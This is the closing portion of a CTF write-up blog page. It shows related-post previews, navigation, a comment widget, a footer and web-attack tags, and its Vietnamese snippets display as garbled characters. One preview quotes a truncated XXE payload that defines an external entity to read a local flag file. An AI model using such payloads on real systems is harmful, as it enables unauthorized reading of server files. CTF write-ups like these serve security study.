mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/noted/"><div class="card-body"> <em class="timeago small" data-ts="1649084880" > 2022-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Noted - picoCTF2022</h3><div class="text-muted small"><p> S∆° l∆∞·ª£c v·ªÅ challenge Trang g·ªìm c√≥ hai ch·ª©c nƒÉng Login v√† Register overview1 Ti·∫øp ƒë√≥ ta th·ªÉ t·∫°o note v√† g·ª≠i link ƒë·ªÉ report. overview2 Ph√¢n t√≠ch Sau khi th·ª≠ th√¨ m√¨nh nh·∫≠n th·∫•y c√≥ l·ªói xss ·ªü ƒë√¢y C...</p></div></div></a></div><div class="card"> <a href="/posts/noCookies/"><div class="card-body"> <em class="timeago small" data-ts="1649398020" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NoCookies - DiceCTF2022</h3><div class="text-muted small"><p> Link challenge https://instancer.mc.ax/no-cookies https://admin-bot.mc.ax/no-cookies Source code Download S∆° l∆∞·ª£c v·ªÅ trang web overview S·∫Ω c√≥ 2 ch·ª©c nƒÉng: Register -&amp;gt; ƒëƒÉng k√≠ account v√† ...</p></div></div></a></div><div class="card"> <a href="/posts/nahamconctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651342200" > 2022-05-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NahamconCTF 2022</h3><div class="text-muted small"><p> Solution for some web challenges solved challenges EXtravagant Upload exp.xml and view it &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;/var/www/flag.t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/sandiegoctf2022/" class="btn btn-outline-primary" prompt="Older"><p>San Diego CTF 2022</p></a> <a href="/posts/PHPLFI2RCE/" class="btn btn-outline-primary" prompt="Newer"><p>C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/nguyendt0">T√¥ ƒê·ªânh Nguy√™n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
